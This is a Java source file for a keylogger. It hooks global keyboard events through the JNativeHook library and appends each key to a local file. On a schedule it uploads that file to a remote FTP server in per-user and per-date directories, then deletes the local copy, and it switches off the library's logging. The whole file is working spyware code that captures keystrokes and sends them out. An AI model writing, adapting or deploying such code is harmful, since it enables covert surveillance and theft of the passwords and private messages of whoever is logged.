package Main;

import java.util.logging.Logger;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.LogManager;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger extends Thread implements NativeKeyListener, FileUploader {
	
	private FileHandler fileHandler;
	private FTPHandler ftpHandler;
	private Scheduler scheduler;
	
	public KeyLogger() {
		fileHandler = FileHandler.getInstance();
		ftpHandler = new FTPHandler();
		scheduler = new Scheduler(this);
	}

    public static void main(String[] args) {
    	KeyLogger keyLogger = new KeyLogger();
    	
    	keyLogger.checkIfPreviousDirectoryExists();
        keyLogger.initializeKeyListener();
        keyLogger.checkPeriodically();
    }
    
    public void checkIfPreviousDirectoryExists() {
    	String yesterdaysDate = Utils.getYesterdaysDate();
    	String yesterdaysDirectoryPath = Utils.getDirectoryPath(yesterdaysDate);
    	boolean pathExists = true;
		try {
			pathExists = ftpHandler.checkDirectoryExists(yesterdaysDirectoryPath);
		} catch (IOException e) {
			System.out.println("Error : " + e.getMessage());
		}
    	if(pathExists==false) {
    		System.out.println("Uploading yesterdays file...");
    		uploadFile(yesterdaysDirectoryPath, yesterdaysDate);
    	}
    }
    
    public void checkPeriodically() {
    	checkIfFileExists();
    	scheduler.checkUploadHour();
    }
    
    public void checkIfFileExists() {
    	if(!fileHandler.fileExists()) {
    		fileHandler.createFile();
    	}
    }
    
	@Override
	public void uploadFile(String directoryPath, String date) {
		ftpHandler.createUserDirectory();
		ftpHandler.createDateDirectory(date);
		ftpHandler.uploadFile(fileHandler.getFile(), directoryPath);
		fileHandler.deleteFile();
		fileHandler.createFile();
	}
    
	@Override
	public void nativeKeyPressed(NativeKeyEvent keyEvent) {
		String keyPressed = NativeKeyEvent.getKeyText(keyEvent.getKeyCode());
		String convertedKey = convertKey(keyPressed);
		System.out.println(convertedKey);
		fileHandler.appendToFile(convertedKey);
	}
	
	public String convertKey(String keyPressed){
		switch(keyPressed) {
			case "Space" :
				keyPressed = " ";
				break;
			case "Period" :
				keyPressed = ".";
				break;
			case "Comma" :
				keyPressed = ",";
				break;
			case "Backspace" :
				keyPressed = "";
				break;
			case "Shift" :
				keyPressed = "";
				break;
			case "Ctrl" :
				keyPressed = "";
				break;
		}
		return keyPressed;
	}
	
    public void initializeKeyListener() {
    	disableConsoleLogger();
        try {
            GlobalScreen.registerNativeHook();
        } 
        catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.exit(1);
        }
        GlobalScreen.addNativeKeyListener(new KeyLogger());
    }
	
    public void disableConsoleLogger() {
    	LogManager.getLogManager().reset();
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
        logger.setUseParentHandlers(false); 
    }
    
    public static void wait(int timeInSeconds) {
        try {
			Thread.sleep(timeInSeconds*1000);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
    }

	@Override
	public void nativeKeyReleased(NativeKeyEvent keyEvent) {}

	@Override
	public void nativeKeyTyped(NativeKeyEvent keyEvent) {}
}



